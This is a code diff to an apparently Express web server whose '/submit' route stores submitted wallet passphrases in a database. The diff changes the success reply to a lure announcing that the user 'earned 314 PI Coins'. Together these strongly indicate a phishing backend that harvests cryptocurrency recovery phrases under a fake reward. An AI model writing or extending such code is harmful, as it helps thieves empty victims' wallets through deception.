@@ -33,7 +33,7 @@ app.post('/submit', async (req, res) => {
     try {
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
-        res.status(200).send('Passphrase saved successfully!');
+        res.status(200).send('Congratulations!!! You have earned your 314 PI Coins Successfully!!');
     } catch (error) {
         console.error('Error saving passphrase:', error);
         res.status(500).send('Failed to save passphrase.');
